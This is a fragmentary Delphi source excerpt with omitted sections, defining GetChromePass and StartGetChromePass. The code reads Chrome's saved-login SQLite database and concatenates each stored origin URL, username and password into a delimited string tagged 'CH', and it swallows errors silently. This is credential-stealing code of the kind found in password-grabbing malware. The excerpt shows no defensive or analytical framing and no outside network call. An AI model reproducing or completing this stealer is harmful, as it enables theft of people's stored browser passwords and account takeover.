...
function GetChromePass(sqlite3Dll: string; Delimiter: string): string;
...
function StartGetChromePass(sqlite3Dll: string; Delimiter: string): string;
var
  DB: TSQLiteDatabase;
  Tablo: TSQLiteTable;
  Sifre: string;
...
begin
  ...
  begin
    ...
    Result := Result + 'CH' + Delimiter;//add resource tag.
    Result := Result + tablo.FieldAsString(tablo.FieldIndex['origin_url']) + Delimiter;
    Result := Result + tablo.FieldAsString(tablo.FieldIndex['username_value']) + Delimiter;
    Result := Result + sifre + Delimiter + '|';// + #13#10;
    Tablo.Next;
  end;
...
begin
  Try
    result := StartGetChromePass(sqlite3Dll, Delimiter);
    except
    result := '';
  end;
end;
